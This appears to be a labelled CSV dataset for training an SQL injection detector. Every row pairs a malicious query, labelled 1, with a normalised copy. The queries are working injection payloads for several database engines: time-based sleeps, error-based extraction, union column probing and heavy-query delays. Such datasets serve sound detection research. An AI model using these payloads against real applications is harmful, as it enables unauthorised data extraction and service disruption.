Query,Label,Query_cleaned
select   (  case when   (  4568  =  4241  )   then 4568 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,select case when 4568 4241 then 4568 else cast 1 as int select 0 from dual end from dual
-3613%'  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  '%'  =  ',1,3613 or 4144 select upper xmltype chr 60 chr 58 chr 113 chr 113 chr 112 chr 106 chr 113 select case when 4144 4144 then 1 else 0 end from dual chr 113 chr 122 chr 118 chr 122 chr 113 chr 62 from dual and
-7242' or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and 'kfff'  =  'kfff,1,7242 or 4144 select upper xmltype chr 60 chr 58 chr 113 chr 113 chr 112 chr 106 chr 113 select case when 4144 4144 then 1 else 0 end from dual chr 113 chr 122 chr 118 chr 122 chr 113 chr 62 from dual and kfff kfff
"1%""   )    )    union all select null,null#",1,1 union all select null null
"1%'   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '",1,1 and 8407 select count from generate_series 1 5000000 and
1  ) ,1,1
"-9145'  )   as xyya where 8950  =  8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--",1,9145 as xyya where 8950 8950 union all select 8950 8950 8950 8950 8950 8950 8950 8950
1%'   )    )    and 9198  =  9198--,1,1 and 9198 9198
-8301'   )    )     )   or   (  5708  =  5268  )  *5268 and    (    (     (  'hkha'  =  'hkha,1,8301 or 5708 5268 5268 and hkha hkha
"-9698'   )    )    as qnjv where 3360  =  3360 or make_set  (  9354  =  9354,7185  )  --",1,9698 as qnjv where 3360 3360 or make_set 9354 9354 7185
"1""   )    )    as aozi where 3354  =  3354 waitfor delay '0:0:5'--",1,1 as aozi where 3354 3354 waitfor delay 0 0 5
"1   )    )    as xebl where 3105  =  3105 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,1 as xebl where 3105 3105 or 8421 select count from generate_series 1 5000000
1' and   (  3020  =  3020  )  *6703,1,1 and 3020 3020 6703
1'   )    )     )   and sleep  (  5  )   and    (    (     (  'hwjy'  =  'hwjy,1,1 and sleep 5 and hwjy hwjy
"1""   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",1,1 or select from select sleep 5 sddo
"make_set  (  2672  =  2672,5440  )  ",1,make_set 2672 2672 5440
1'   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  'ineq' like 'ineq,1,1 and 6969 select 6969 from pg_sleep 5 and ineq like ineq
"1 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  -- wvjy",1,1 procedure analyse extractvalue 9255 concat 0x5c benchmark 5000000 md5 0x52515a50 1 wvjy
1  )   as odqn where 3910  =  3910,1,1 as odqn where 3910 3910
-8945   )    )    as fszo where 2320  =  2320 union all select 2320--,1,8945 as fszo where 2320 2320 union all select 2320
"-5097'  )   union all select 8992,8992,8992,8992,8992,8992,8992,8992,8992--",1,5097 union all select 8992 8992 8992 8992 8992 8992 8992 8992 8992
"1',  (  select   (  case when   (  5777  =  5777  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",1,1 select case when 5777 5777 then 1 else cast 1 as int select 0 from dual end from dual
"1'   )    )    as arhm where 3268  =  3268 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1,1 as arhm where 3268 3268 or select 2 if select from select concat 0x7171706a71 select elt 8113 8113 1 0x717a767a71 0x78 s 8446744073709551610 8446744073709551610
"1 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1 or 2367 select count from rdb fields as t1 rdb types as t2 rdb collations as t3 rdb functions as t4
"-5190%"" or 8298  =  9306 and ""%""  =  """,1,5190 or 8298 9306 and
"1%""   )    )     )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1 or 7417 select count from sysibm systables as t1 sysibm systables as t2 sysibm systables as t3
"1""  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,1 or 8514 benchmark 5000000 md5 0x544d5a4c
"1""  )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1 or 7417 select count from sysibm systables as t1 sysibm systables as t2 sysibm systables as t3
"1  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  9509  =  9509",1,1 and 3707 select count from sysibm systables as t1 sysibm systables as t2 sysibm systables as t3 and 9509 9509
1'  )   or sleep  (  5  ) ,1,1 or sleep 5
"1"" or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and ""xmvr""  =  ""xmvr",1,1 or row 1045 7562 select count concat 0x7171706a71 select elt 1045 1045 1 0x717a767a71 floor rand 0 2 x from select 8488 union select 5584 union select 3051 union select 1210 a group by x and xmvr xmvr
"1"" where 4597  =  4597 rlike sleep  (  5  )  --",1,1 where 4597 4597 rlike sleep 5
1'||  (  select 'aojt' from dual where 8499  =  8499,1,1 select aojt from dual where 8499 8499
"1'||  (  select 'goxu' where 9215  =  9215 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,1 select goxu where 9215 9215 and char 109 char 79 char 70 char 90 regexp_substring repeat right char 5012 0 5000000000 null
"1"" rlike sleep  (  5  )  #",1,1 rlike sleep 5
"1""  )   as hoiv where 9708  =  9708 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1,1 as hoiv where 9708 9708 and exp select from select concat 0x7171706a71 select elt 8190 8190 1 0x717a767a71 0x78 x
"1'+  (  select 'aliz' where 5050  =  5050 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   +'",1,1 select aliz where 5050 5050 or 4411 select count from sysusers as sys1 sysusers as sys2 sysusers as sys3 sysusers as sys4 sysusers as sys5 sysusers as sys6 sysusers as sys7
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and 'nkte'  =  'nkte",1,select count from rdb fields as t1 rdb types as t2 rdb collations as t3 rdb functions as t4 and nkte nkte
"1  )   where 6340  =  6340 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1,1 where 6340 6340 and exp select from select concat 0x7171706a71 select elt 8190 8190 1 0x717a767a71 0x78 x
"1'   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'novq'  =  'novq",1,1 and 3202 like abcdefg upper hex randomblob 500000000 2 and novq novq
"1%""   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   ""%""  =  """,1,1 or select 9173 from select count concat 0x7171706a71 select elt 9173 9173 1 0x717a767a71 floor rand 0 2 x from information_schema character_sets group by x a and
"1%'   )    )    and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1 and 2716 select count from sysusers as sys1 sysusers as sys2 sysusers as sys3 sysusers as sys4 sysusers as sys5 sysusers as sys6 sysusers as sys7
select   (  case when   (  1724  =  6528  )   then 1724 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,select case when 1724 6528 then 1724 else cast 1 as int select 0 from dual end from dual
1'   )    )    as zqeg where 4729  =  4729 and   (  1098  =  9682  )  *9682--,1,1 as zqeg where 4729 4729 and 1098 9682 9682
"-9289   )    )    or make_set  (  5101  =  9919,9919  )   and    (    (   8977  =  8977",1,9289 or make_set 5101 9919 9919 and 8977 8977
"1"" where 3484  =  3484 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1 where 3484 3484 and char 107 char 121 char 97 char 80 regexp_substring repeat left crypt_key char 65 char 69 char 83 null 0 500000000 null
select   (  case when   (  1434  =  1549  )   then 1434 else 1434*  (  select 1434 from mysql.db  )   end  )  #,1,select case when 1434 1549 then 1434 else 1434 select 1434 from mysql db end
"1   )    )    as shmg where 1371  =  1371 union all select null,null,null,null,null,null,null,null,null,null#",1,1 as shmg where 1371 1371 union all select null null null null null null null null null null
"-7329""   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""borw"" like ""borw",1,7329 or 5903 qqpjq select case 5903 when 5903 then 1 else 0 end from rdb database qzvzq and borw like borw
"1 where 8114  =  8114 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1 where 8114 8114 and 6510 select count from sysusers as sys1 sysusers as sys2 sysusers as sys3 sysusers as sys4 sysusers as sys5 sysusers as sys6 sysusers as sys7
"1  )   as dqda where 1624  =  1624 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,1 as dqda where 1624 1624 and 8635 select count from generate_series 1 5000000
"1""   )    )    and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,1 and 8635 select count from generate_series 1 5000000
1'  )   where 8776  =  8776 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,1,1 where 8776 8776 and 6969 select 6969 from pg_sleep 5
select sleep  (  5  ) ,1,select sleep 5
"-7184  )   as fshx where 3408  =  3408 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1,7184 as fshx where 3408 3408 or 5023 ctxsys drithsx sn 5023 chr 113 chr 113 chr 112 chr 106 chr 113 select case when 5023 5023 then 1 else 0 end from dual chr 113 chr 122 chr 118 chr 122 chr 113
"1"" where 7796  =  7796",1,1 where 7796 7796
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   'xlvt'  =  'xlvt",1,select count from rdb fields as t1 rdb types as t2 rdb collations as t3 rdb functions as t4 and xlvt xlvt
"1'  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  'gfxr'  =  'gfxr",1,1 and row 6237 7469 select count concat 0x7171706a71 select elt 6237 6237 1 0x717a767a71 floor rand 0 2 x from select 5192 union select 3785 union select 3931 union select 7158 a group by x and gfxr gfxr
"1  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",1,1 or 7552 select count from rdb fields as t1 rdb types as t2 rdb collations as t3 rdb functions as t4
1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,1,1 waitfor delay 0 0 5 and 1636 1636
"1'||  (  select 'sned' where 4957  =  4957 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1 select sned where 4957 4957 and 9254 select count from rdb fields as t1 rdb types as t2 rdb collations as t3 rdb functions as t4
-9212 or 1026  =  7967#,1,9212 or 1026 7967
"1""  )   where 6843  =  6843 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",1,1 where 6843 6843 or 6793 select 6793 from pg_sleep 5
"-5174'   )    )     )   or make_set  (  9515  =  7938,7938  )   and    (    (     (  'ygee'  =  'ygee",1,5174 or make_set 9515 7938 7938 and ygee ygee
select sleep  (  5  )   and    (    (   'ilcv'  =  'ilcv,1,select sleep 5 and ilcv ilcv
"1 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1,1 and 6510 select count from sysusers as sys1 sysusers as sys2 sysusers as sys3 sysusers as sys4 sysusers as sys5 sysusers as sys6 sysusers as sys7
"1"" union all select null,null--",1,1 union all select null null
"1%""  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""%""  =  """,1,1 and char 111 char 77 char 121 char 88 regexp_substring repeat left crypt_key char 65 char 69 char 83 null 0 500000000 null and
"1""   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and ""lxfm""  =  ""lxfm",1,1 select case when 4587 4587 then regexp_substring repeat left crypt_key char 65 char 69 char 83 null 0 500000000 null else char 76 char 65 char 102 char 72 end from values 0 and lxfm lxfm
"1'   )    )     )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1 and 2716 select count from sysusers as sys1 sysusers as sys2 sysusers as sys3 sysusers as sys4 sysusers as sys5 sysusers as sys6 sysusers as sys7
"1   )    )    as gcvw where 7363  =  7363 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1,1 as gcvw where 7363 7363 or row 1045 7562 select count concat 0x7171706a71 select elt 1045 1045 1 0x717a767a71 floor rand 0 2 x from select 8488 union select 5584 union select 3051 union select 1210 a group by x
"1 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  # kkmw",1,1 and 6510 select count from sysusers as sys1 sysusers as sys2 sysusers as sys3 sysusers as sys4 sysusers as sys5 sysusers as sys6 sysusers as sys7 kkmw
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   '%'  =  '",1,select count from generate_series 1 5000000 and
"1  )   where 7485  =  7485 and make_set  (  8403  =  8403,8899  )  --",1,1 where 7485 7485 and make_set 8403 8403 8899
"-7824""   )    )     )   union all select 3800,3800,3800,3800,3800,3800,3800,3800,3800--",1,7824 union all select 3800 3800 3800 3800 3800 3800 3800 3800 3800
"1  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",1,1 or exp select from select concat 0x7171706a71 select elt 6270 6270 1 0x717a767a71 0x78 x
"1' and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'bpbe' like 'bpbe",1,1 and char 111 char 77 char 121 char 88 regexp_substring repeat left crypt_key char 65 char 69 char 83 null 0 500000000 null and bpbe like bpbe
"1'+  (  select jxgx where 7446  =  7446 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1 select jxgx where 7446 7446 and 8189 select count from sysibm systables as t1 sysibm systables as t2 sysibm systables as t3
"-3315""   )    )     )   union all select 2457,2457,2457,2457,2457,2457--",1,3315 union all select 2457 2457 2457 2457 2457 2457
select   (  case when   (  3626  =  6022  )   then 3626 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,select case when 3626 6022 then 3626 else cast 1 as int select 0 from dual end from dual
"1%""   )    )     )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,1 and char 109 char 79 char 70 char 90 regexp_substring repeat right char 5012 0 5000000000 null
"1'  )   as dwgv where 1525  =  1525 union all select null,null--",1,1 as dwgv where 1525 1525 union all select null null
"1   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  4744  =  4744",1,1 and 6414 select count from rdb fields as t1 rdb types as t2 rdb collations as t3 rdb functions as t4 and 4744 4744
"1'   )    )    as ydbt where 8062  =  8062 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1 as ydbt where 8062 8062 and 6414 select count from rdb fields as t1 rdb types as t2 rdb collations as t3 rdb functions as t4
1' in boolean mode  )   or sleep  (  5  )  #,1,1 in boolean mode or sleep 5
"1'  )   as lrif where 6525  =  6525 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1,1 as lrif where 6525 6525 or row 1045 7562 select count concat 0x7171706a71 select elt 1045 1045 1 0x717a767a71 floor rand 0 2 x from select 8488 union select 5584 union select 3051 union select 1210 a group by x
1  )   and 2457  =  8146,1,1 and 2457 8146
"1'  )   as uqkz where 8482  =  8482 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,1 as uqkz where 8482 8482 and 8407 select count from generate_series 1 5000000
"1"" and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",1,1 and 3707 select count from sysibm systables as t1 sysibm systables as t2 sysibm systables as t3
1' and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and 'ixzr'  =  'ixzr,1,1 and 3754 select upper xmltype chr 60 chr 58 chr 113 chr 113 chr 112 chr 106 chr 113 select case when 3754 3754 then 1 else 0 end from dual chr 113 chr 122 chr 118 chr 122 chr 113 chr 62 from dual and ixzr ixzr
-9688%'   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   '%'  =  ',1,9688 or 2724 in char 113 char 113 char 112 char 106 char 113 select case when 2724 2724 then char 49 else char 48 end char 113 char 122 char 118 char 122 char 113 and
1' and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'napi' like 'napi,1,1 and 7756 dbms_utility sqlid_to_sqlhash chr 113 chr 113 chr 112 chr 106 chr 113 select case when 7756 7756 then 1 else 0 end from dual chr 113 chr 122 chr 118 chr 122 chr 113 and napi like napi
select case when 5559  =  3483 then 1 else null end--,1,select case when 5559 3483 then 1 else null end
"1  )   where 2678  =  2678 union all select null,null,null,null,null,null,null,null,null#",1,1 where 2678 2678 union all select null null null null null null null null null
1  )   as jvmv where 3857  =  3857 and   (  5717  =  6483  )  *6483--,1,1 as jvmv where 3857 3857 and 5717 6483 6483
select sleep  (  5  )   and    (    (     (  5552  =  5552,1,select sleep 5 and 5552 5552
"1  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,1 procedure analyse extractvalue 9627 concat 0x5c benchmark 5000000 md5 0x4b774c75 1
"1%""  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,1,1 or 8315 select count from sysibm systables as t1 sysibm systables as t2 sysibm systables as t3 and
"1%""   )    )    union all select null,null,null,null,null,null,null--",1,1 union all select null null null null null null null
"-4028  )   where 3244  =  3244 union all select 3244,3244,3244,3244,3244,3244,3244,3244--",1,4028 where 3244 3244 union all select 3244 3244 3244 3244 3244 3244 3244 3244
"1'+  (  select lhtn where 8484  =  8484 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   +'",1,1 select lhtn where 8484 8484 and char 111 char 77 char 121 char 88 regexp_substring repeat left crypt_key char 65 char 69 char 83 null 0 500000000 null
"1'   )    )    as usrk where 6324  =  6324 union all select null,null,null,null,null,null,null,null,null,null--",1,1 as usrk where 6324 6324 union all select null null null null null null null null null null
"-7715'  )   union all select 4830,4830,4830,4830,4830,4830,4830,4830--",1,7715 union all select 4830 4830 4830 4830 4830 4830 4830 4830
"1""   )    )    rlike sleep  (  5  )   and    (    (   ""fzlr""  =  ""fzlr",1,1 rlike sleep 5 and fzlr fzlr
"-9572%""  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""%""  =  """,1,9572 or 1570 convert int select char 113 char 113 char 112 char 106 char 113 select case when 1570 1570 then char 49 else char 48 end char 113 char 122 char 118 char 122 char 113 and
select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,1,select sleep 5 and rzjf rzjf
"1%""   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""%""  =  """,1,1 or extractvalue 1297 concat 0x5c 0x7171706a71 select elt 1297 1297 1 0x717a767a71 and
"1""  )   union all select null,null,null,null,null--",1,1 union all select null null null null null
"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'moyb'  =  'moyb",1,1 and 6055 ctxsys drithsx sn 6055 chr 113 chr 113 chr 112 chr 106 chr 113 select case when 6055 6055 then 1 else 0 end from dual chr 113 chr 122 chr 118 chr 122 chr 113 and moyb moyb
select pg_sleep  (  5  )   and    (    (     (  'mgbm' like 'mgbm,1,select pg_sleep 5 and mgbm like mgbm
"1'   )    )    union all select null,null,null,null,null,null--",1,1 union all select null null null null null null
1'   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  'iuki'  =  'iuki,1,1 and 2853 cast chr 113 chr 113 chr 112 chr 106 chr 113 select case when 2853 2853 then 1 else 0 end text chr 113 chr 122 chr 118 chr 122 chr 113 as numeric and iuki iuki
"1%""   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  ""%""  =  """,1,1 or elt 6272 6272 sleep 5 and
"1%""  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1 or 6979 like abcdefg upper hex randomblob 500000000 2
"1'   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  'eflk'  =  'eflk",1,1 and 8407 select count from generate_series 1 5000000 and eflk eflk
"1""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1,1 and select from select sleep 5 gcrr
1   )    )    as bjxd where 4299  =  4299,1,1 as bjxd where 4299 4299
1'  )   where 9817  =  9817,1,1 where 9817 9817
"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '",1,1 or 8421 select count from generate_series 1 5000000 and
"1%""   )    )     )   or sleep  (  5  )   and    (    (     (  ""%""  =  """,1,1 or sleep 5 and
1 where 8180  =  8180 or sleep  (  5  )  #,1,1 where 8180 8180 or sleep 5
"-8312%""   )    )    union all select 4972--",1,8312 union all select 4972
1'||  (  select 'pmpd' where 9803  =  9803,1,1 select pmpd where 9803 9803
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  'xori' like 'xori",1,select count from generate_series 1 5000000 and xori like xori
-5432'  )   as dndq where 9633  =  9633 order by 1#,1,5432 as dndq where 9633 9633 order by 1
